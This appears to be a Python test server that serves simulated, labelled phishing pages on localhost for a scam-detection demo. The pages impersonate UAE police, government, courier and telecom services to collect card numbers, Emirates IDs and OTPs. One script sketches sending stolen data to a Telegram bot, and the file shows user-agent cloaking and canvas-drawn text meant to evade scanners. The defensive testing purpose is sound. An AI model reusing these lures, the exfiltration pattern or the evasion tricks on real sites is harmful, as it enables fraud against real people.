"""Local TEST scam pages for the Kashshaf demo.

Every page here is a simulation, labelled as a test, and served only on this
machine (http://<name>.localhost:8081). Never deploy these pages publicly:
a hosted copy would look like a real phishing site.

Run:  python3 test_sites/server.py
"""
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import urllib.parse
import urllib.request

KASHSHAF = "http://127.0.0.1:8080"  # the Kashshaf server whose blocklist the simulated network applies


def blocked_target(url: str) -> str | None:
    """Simulated network block (what a telecom does with Kashshaf's blocklist): the warning page for a blocked
    link, None otherwise. If Kashshaf is not running, pages are served as they are."""
    try:
        with urllib.request.urlopen(f"{KASHSHAF}/api/check?url={urllib.parse.quote(url, safe='')}", timeout=2) as r:
            result = json.loads(r.read())
    except Exception:
        return None
    return f"http://localhost:8080{result['warning_url']}" if result.get("blocked") else None

PORT = 8081

# Fake indicators shared between pages so the gang graph has something to find.
GANG_A_TELEGRAM = "7712345678:AAFakeTestTokenForDemoOnly000000000"
GANG_B_WHATSAPP = "https://wa.me/971500000099"
GANG_B_IBAN = "AE070331234567890123456"

FOOTER = ('<p style="margin-top:40px;font:12px sans-serif;color:#999">'
          "TEST PAGE: simulated scam for the Kashshaf demo. Not a real service.</p>")


def page(title: str, body: str, lang: str = "en", rtl: bool = False) -> str:
    direction = ' dir="rtl"' if rtl else ""
    return (f'<!doctype html><html lang="{lang}"{direction}><head><meta charset="utf-8">'
            f'<meta name="viewport" content="width=device-width,initial-scale=1"><title>{title}</title>'
            "<style>body{font-family:system-ui,sans-serif;max-width:480px;margin:24px auto;padding:0 16px}"
            "input{display:block;width:100%;padding:10px;margin:6px 0 12px;box-sizing:border-box}"
            "button{padding:12px 20px;background:#0a5;color:#fff;border:0;border-radius:6px}</style>"
            f"</head><body>{body}{FOOTER}</body></html>")


CARD_FORM = """
<form action="#" method="post" onsubmit="return false">
  <label>Card number / رقم البطاقة</label><input name="card_number" placeholder="0000 0000 0000 0000">
  <label>Expiry</label><input name="expiry" placeholder="MM/YY">
  <label>CVV</label><input name="cvv" placeholder="123">
  <button>Pay now / ادفع الآن</button>
</form>"""

TELEGRAM_EXFIL = f"""<script>
// stolen data is sent straight to the scammer's Telegram bot
const BOT = "{GANG_A_TELEGRAM}";
function send(d){{ fetch("https://api.telegram.org/bot"+BOT+"/sendMessage?chat_id=1&text="+d); }}
</script>"""

PAGES = {
    "adpolice-fines-pay": lambda mobile: page(
        "شرطة أبوظبي - دفع المخالفات",
        "<h2>شرطة أبوظبي | Abu Dhabi Police</h2>"
        "<p>لديك مخالفة مرورية غير مدفوعة بقيمة <b>400 درهم</b>. ادفع خلال 24 ساعة لتجنب حجز المركبة ومضاعفة الغرامة.</p>"
        "<p>You have an unpaid traffic fine of AED 400. Pay within 24 hours to avoid vehicle impoundment.</p>"
        + CARD_FORM + TELEGRAM_EXFIL, "ar", True),

    # Cloaked: scanners and servers get a cooking blog, phones get the scam.
    "tamm-refund-uae": lambda mobile: page(
        "TAMM - Refund", "<h2>TAMM | منصة تم</h2>"
        "<p>Abu Dhabi Government Services: you are eligible for a refund of <b>AED 1,250</b>. "
        "Enter your Emirates ID and card to receive it before midnight.</p>"
        '<label>Emirates ID / رقم الهوية</label><input name="emirates_id">' + CARD_FORM + TELEGRAM_EXFIL
    ) if mobile else page(
        "Mama Huda's Kitchen", "<h2>Mama Huda's Kitchen</h2><p>Today: the best chicken machboos recipe. "
        "Soak the rice for 30 minutes, fry the onions until golden, add loomi and baharat...</p>"
        "<p>Tomorrow: luqaimat with date syrup.</p>"),

    "consumer-protection-refund": lambda mobile: page(
        "Consumer Protection UAE", "<h2>Consumer Protection | حماية المستهلك</h2>"
        "<p>Lost money to an online store? We refund your money in 48 hours. "
        "Pay a AED 99 verification fee to open your case.</p>" + CARD_FORM + TELEGRAM_EXFIL),

    "aramex-redelivery": lambda mobile: page(
        "Aramex - Redelivery", "<h2>Aramex</h2><p>Your parcel AX99231 is on hold. "
        "Pay the AED 5 redelivery fee within 12 hours or it will be returned.</p>" + CARD_FORM +
        f'<p>Problems? Bank transfer to IBAN {GANG_B_IBAN} or chat with us: <a href="{GANG_B_WHATSAPP}">WhatsApp</a></p>'),

    "etisalat-points": lambda mobile: page(
        "اتصالات - استبدال النقاط", "<h2>اتصالات | Etisalat Smiles</h2>"
        "<p>نقاطك (12,400 نقطة) ستنتهي اليوم! أدخل رقم هاتفك ورمز التحقق OTP لاستبدالها بقسيمة 500 درهم.</p>"
        '<label>رقم الهاتف</label><input name="phone"><label>رمز التحقق OTP</label><input name="otp">'
        f'<button>استبدال</button><p>للمساعدة: <a href="{GANG_B_WHATSAPP}">واتساب</a></p>', "ar", True),

    # Grey area: uses du's name on a look-alike domain but asks for nothing yet. Suspicious, for analyst review.
    "du-uae-rewards": lambda mobile: page(
        "عروض دو | du Rewards", "<h2>شركة دو | du telecom</h2>"
        "<p>عرض خاص من شركة دو لعملاء الإمارات: 50 جيجابايت مجاناً لمدة شهر. التفعيل قريباً، تابعونا.</p>", "ar", True),

    "uaepass-verify": lambda mobile: page(
        "UAE PASS - تأكيد الحساب", "<h2>UAE PASS | الهوية الرقمية</h2>"
        "<p>سيتم إيقاف حسابك في UAE PASS خلال 24 ساعة. أكّد هويتك برقم الهوية ورمز التحقق المرسل إلى هاتفك.</p>"
        "<p>Your UAE PASS account will be suspended within 24 hours. Confirm with your Emirates ID and the OTP.</p>"
        '<label>رقم الهوية / Emirates ID</label><input name="emirates_id">'
        '<label>رمز التحقق / OTP</label><input name="otp"><button>تأكيد / Confirm</button>', "ar", True),

    # Evasion: the whole message is drawn on a canvas (an image), so text scanners only see a card form.
    "ae-pay-notice": lambda mobile: page(
        "Notice", '<canvas id="c" width="440" height="176" style="width:100%;max-width:440px"></canvas>'
        "<script>const c=document.getElementById('c').getContext('2d');"
        "c.fillStyle='#0b3d91';c.fillRect(0,0,440,46);c.fillStyle='#fff';c.font='bold 21px sans-serif';"
        "c.direction='rtl';c.textAlign='right';c.fillText('شرطة أبوظبي | Abu Dhabi Police',428,31);"
        "c.fillStyle='#222';c.font='18px sans-serif';c.fillText('لديك مخالفة مرورية غير مدفوعة: 400 درهم',428,84);"
        "c.fillText('ادفع خلال 24 ساعة لتجنب حجز المركبة',428,114);c.direction='ltr';c.textAlign='left';"
        "c.font='15px sans-serif';c.fillText('Unpaid traffic fine AED 400. Pay within 24 hours.',12,156);</script>"
        + CARD_FORM, "ar", True),

    "karak-cafe": lambda mobile: page(
        "Karak Corner", "<h2>Karak Corner, Khalifa City</h2><p>Fresh karak tea, paratha and chips oman. "
        "Open 6am to 2am. Call us or visit us next to the park.</p>"),
}


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        host = (self.headers.get("Host") or "").split(":")[0]
        name = host.removesuffix(".localhost")
        ua = self.headers.get("User-Agent", "")
        mobile = any(k in ua for k in ("iPhone", "Android"))
        # People behind the simulated network get the warning page for a blocked link;
        # Kashshaf's own scans pass, so a rescan still sees the real page.
        scan = self.headers.get("X-Kashshaf-Scan") or "KashshafScan" in ua
        target = None if scan else blocked_target(f"http://{self.headers.get('Host')}{self.path}")
        if target:
            self.send_response(302)
            self.send_header("Location", target)
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return
        build = PAGES.get(name)
        body = build(mobile) if build else page("Not found", "<p>No test page here.</p>")
        data = body.encode()
        self.send_response(200 if build else 404)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    print(f"TEST scam pages on http://<name>.localhost:{PORT}  ({', '.join(PAGES)})")
    ThreadingHTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
